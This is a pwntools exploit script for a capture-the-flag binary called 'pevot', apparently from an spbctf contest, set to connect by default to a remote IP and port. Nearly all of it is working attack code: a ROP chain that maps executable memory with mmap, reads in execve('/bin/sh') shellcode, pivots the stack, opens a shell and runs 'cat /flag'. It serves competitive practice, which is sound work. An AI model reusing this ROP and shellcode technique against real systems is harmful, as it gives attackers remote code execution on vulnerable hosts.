#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./pevot')

if exe.bits == 32:
    lindbg = "/root/linux_server"
else:
    lindbg = "/root/linux_server64"


# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '109.233.56.90'
port = int(args.PORT or 11616)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.EDB:
        return process(['edb', '--run', exe.path] + argv, *a, **kw)
    elif args.QIRA:
        return process(['qira', exe.path] + argv, *a, **kw)
    elif args.IDA:
        return process([lindbg], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x400000)
# RWX:      Has RWX segments

io = start()

LEAVE_RET = 0x401cd2
FGETS = 0x409840 # rdi -> ptr to buf, rsi -> 8, rdx -> 0
MMAP64 = 0x43F7D0
POP_RAX = 0x43f533 # 0x3b
POP_RDI = 0x4017e6 # ptr to /bin/sh
POP_RSI = 0x40793e # 0
POP_RDX = 0x4016fb # 0
POP_RCX_del_6 = 0x4430a7 
MOV_RDI_RAX = 0x46d51e
MOV_RSI_RSP_SYSCALL = 0x46b25e
RET = 0x401016

shellcode = b"\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"

MOV_RSP_RCX = 0x47d414
SYSCALL = 0x40e73c

# mmap64: 
#   rdi -> addr; 
#   rsi -> 0x1000; 
#   rdx -> 7; 
#   rcx -> 0x22; 
#   r8  -> -1; 
#   r9  -> 0 

addr = 0x100000

MOV_R9_RAX_MOV_R9_RAX_POP_R12_R13_R14 = 0x456f30
MOV_R8_RDI_MOV_RDI_R8_POP_RBX_RBP_R12 = 0x411f90

pl = p64(POP_RAX)
pl += p64(0)
pl += p64(MOV_R9_RAX_MOV_R9_RAX_POP_R12_R13_R14)
pl += p64(0)
pl += p64(0)
pl += p64(0)

pl += p64(POP_RDI)
pl += p64(0xFFFFFFFFFFFFFFFF) # -1
pl += p64(MOV_R8_RDI_MOV_RDI_R8_POP_RBX_RBP_R12)
pl += p64(0)
pl += p64(0)
pl += p64(0)

pl += p64(POP_RCX_del_6)
pl += p64(0x22)

pl += p64(POP_RDX)
pl += 6*b"\x00" # offset for POP_RCX_del_6
pl += p64(7)

pl += p64(POP_RSI)
pl += p64(0x1000)

pl += p64(POP_RDI)
pl += p64(addr)

pl += p64(MMAP64)
# read shellcode

pl += p64(POP_RDI)
pl += p64(0)
pl += p64(POP_RSI)
pl += p64(addr)
pl += p64(POP_RDX)
pl += p64(len(shellcode)) # len of shellcode
pl += p64(POP_RAX)
pl += p64(0)
pl += p64(SYSCALL)
pl += p64(addr)

pl = pl.ljust(512, b"\x00")
pl += p64(MOV_RSP_RCX)

io.sendline(pl)

io.send(shellcode)
io.sendline("cat /flag")

io.recvuntil("spbctf")
flag = io.recv().decode()
log.success(f"Flag: spbctf{flag}")

io.close()

